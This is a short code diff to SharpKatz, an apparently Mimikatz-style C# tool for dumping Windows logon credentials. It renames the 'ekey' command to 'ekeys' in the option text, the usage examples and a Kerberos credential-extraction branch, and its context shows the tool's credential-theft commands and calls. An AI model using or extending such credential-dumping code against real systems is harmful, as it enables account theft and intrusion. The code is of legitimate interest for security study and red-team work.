@@ -19,7 +19,7 @@ namespace SharpKatz
 
             OptionSet opts = new OptionSet()
             {
-                { "Command=", "--Command logonpasswords,ekey,msv,kerberos,tspkg,credman,wdigest", v => command = v },
+                { "Command=", "--Command logonpasswords,ekeys,msv,kerberos,tspkg,credman,wdigest", v => command = v },
                 { "h|?|help",  "Show available options", v => showhelp = v != null },
             };
 
@@ -37,7 +37,7 @@ namespace SharpKatz
                 opts.WriteOptionDescriptions(Console.Out);
                 Console.WriteLine();
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command logonpasswords");
-                Console.WriteLine("[*] Example: SharpKatz.exe --Command ekey");
+                Console.WriteLine("[*] Example: SharpKatz.exe --Command ekeys");
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command msv");
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command kerberos");
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command tspkg");
@@ -122,7 +122,7 @@ namespace SharpKatz
             if (command.Equals("logonpasswords") || command.Equals("tspkg"))
                 Module.Tspkg.FindCredentials(hProcess, tspkg, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
 
-            if (command.Equals("logonpasswords") || command.Equals("kerberos") || command.Equals("ekey"))
+            if (command.Equals("logonpasswords") || command.Equals("kerberos") || command.Equals("ekeys"))
             {
                 List<byte[]> klogonlist = Module.Kerberos.FindCredentials(hProcess, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
 
